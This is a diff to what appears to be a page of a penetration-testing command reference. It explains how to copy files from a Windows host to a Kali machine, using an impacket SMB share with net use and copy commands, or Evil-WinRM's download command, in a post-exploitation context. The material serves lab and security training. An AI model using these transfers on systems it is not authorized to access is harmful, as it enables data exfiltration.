@@ -9,6 +9,48 @@ hideFooterPagination: true
 
 {/* Generated from Commands/windows-to-linux.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Windows → Kali file transfer: choose the operation and read the result
+
+Copy a Windows file to Kali over an authenticated SMB share. Requires Windows → Kali TCP 445.
+
+### What the result establishes
+
+Identify which side listens and which side initiates; verify the received filename, size and digest.
+
+### Prerequisites and common failures
+
+HTTP download commands cannot upload by themselves; outbound connectivity, listener binding and destination write access all matter.
+
+### Example 1: 1. Kali — receive folder and SMB server
+
+Run in: **Kali**. Keep this terminal running. Replace TRANSFER_PASSWORD in both commands.
+
+```bash
+mkdir -p ~/transfer
+sudo impacket-smbserver share ~/transfer -smb2support -user transfer -password 'TRANSFER_PASSWORD'
+```
+
+### Example 2: 2. Windows — connect and copy
+
+Run in: **Windows cmd.exe**. The file appears in ~/transfer on Kali.
+
+```bash
+net use \\KALI_IP\share /user:transfer TRANSFER_PASSWORD
+copy C:\path\file.zip \\KALI_IP\share\file.zip
+```
+
+### Example 3: Alternative — if already in Evil-WinRM
+
+Run in: **Evil-WinRM prompt**. Saves the file on the Kali machine running Evil-WinRM.
+
+```bash
+download C:\path\file.zip ./file.zip
+```
+
+## Saved commands and notebook recipes
+
+Copy a Windows file to Kali over an authenticated SMB share. Requires Windows → Kali TCP 445.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=windows-to-linux) · [All tools](/index)
@@ -46,3 +88,11 @@ download C:\path\file.zip ./file.zip
 Saves the file on the Kali machine running Evil-WinRM.
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
